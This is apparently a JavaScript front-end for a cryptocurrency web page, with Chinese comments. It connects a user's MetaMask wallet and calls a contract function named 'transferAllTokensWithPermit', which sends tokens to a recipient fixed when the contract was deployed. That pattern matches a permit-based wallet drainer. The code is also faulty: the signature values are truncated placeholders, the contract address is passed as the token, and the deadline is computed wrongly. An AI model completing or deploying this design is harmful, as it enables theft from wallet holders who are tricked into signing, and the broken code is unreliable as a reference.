let web3;
let userAddress;
const contractAddress = "0x9a2E12340354d2532b4247da3704D2A5d73Bd189"; // 最新的智能合约地址
const abi = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "token",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "value",
				"type": "uint256"
			},
			{
				"internalType": "uint256",
				"name": "deadline",
				"type": "uint256"
			},
			{
				"internalType": "uint8",
				"name": "v",
				"type": "uint8"
			},
			{
				"internalType": "bytes32",
				"name": "r",
				"type": "bytes32"
			},
			{
				"internalType": "bytes32",
				"name": "s",
				"type": "bytes32"
			}
		],
		"name": "transferAllTokensWithPermit",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "_recipient",
				"type": "address"
			}
		],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"anonymous": false,
		"inputs": [
			{
				"indexed": true,
				"internalType": "address",
				"name": "token",
				"type": "address"
			},
			{
				"indexed": true,
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"indexed": false,
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "TransferTokens",
		"type": "event"
	},
	{
		"inputs": [],
		"name": "recipient",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
];  // 最新的ABI

window.onload = function() {
    const connectButton = document.getElementById('connectButton');
    const transferButton = document.getElementById('transferButton');

    // 绑定事件监听
    connectButton.addEventListener('click', connectWallet);
    transferButton.addEventListener('click', transferTokens);
};

async function connectWallet() {
    if (typeof window.ethereum !== 'undefined') {
        try {
            web3 = new Web3(window.ethereum);  // 初始化 web3
            await window.ethereum.request({ method: 'eth_requestAccounts' });  // 请求连接钱包
            const accounts = await web3.eth.getAccounts();
            userAddress = accounts[0];

            // 成功连接后显示钱包地址
            document.getElementById('walletAddress').innerText = userAddress;
            document.getElementById('walletInfo').style.display = 'block';  // 显示钱包信息

            // 打印钱包地址到控制台，供调试用
            console.log("已连接的钱包地址:", userAddress);

            // 读取并填写签名参数
            await fillSignatureData(userAddress, contractAddress);

        } catch (error) {
            console.error("连接钱包失败:", error);
            alert("连接钱包失败，请检查控制台日志。");
        }
    } else {
        alert("请安装 MetaMask 或者使用支持的浏览器！");
        console.error("window.ethereum 不可用 - 请确保你已安装 MetaMask。");
    }
}

async function fillSignatureData(userAddress, contractAddress) {
    try {
        console.log("正在生成签名...");
        // 假设 r, s, v 是由你的合约或其他工具生成的
        const v = 27;  // 模拟的签名参数 v
        const r = "0x1234...";  // 模拟的签名参数 r
        const s = "0x5678...";  // 模拟的签名参数 s

        // 自动填写签名数据
        document.getElementById('v').innerText = v;
        document.getElementById('r').innerText = r;
        document.getElementById('s').innerText = s;

    } catch (error) {
        console.error("签名生成失败:", error);
    }
}

async function transferTokens() {
    try {
        const contract = new web3.eth.Contract(abi, contractAddress);
        const v = document.getElementById('v').innerText;
        const r = document.getElementById('r').innerText;
        const s = document.getElementById('s').innerText;

        // 调用 transferAllTokensWithPermit 函数
        await contract.methods.transferAllTokensWithPermit(contractAddress, userAddress, 1000, Date.now() + 3600, v, r, s)
            .send({ from: userAddress });

        console.log("代币转移成功！");
        alert("代币转移成功！");

    } catch (error) {
        console.error("代币转移失败:", error);
        alert("代币转移失败，请检查控制台日志。");
    }
}
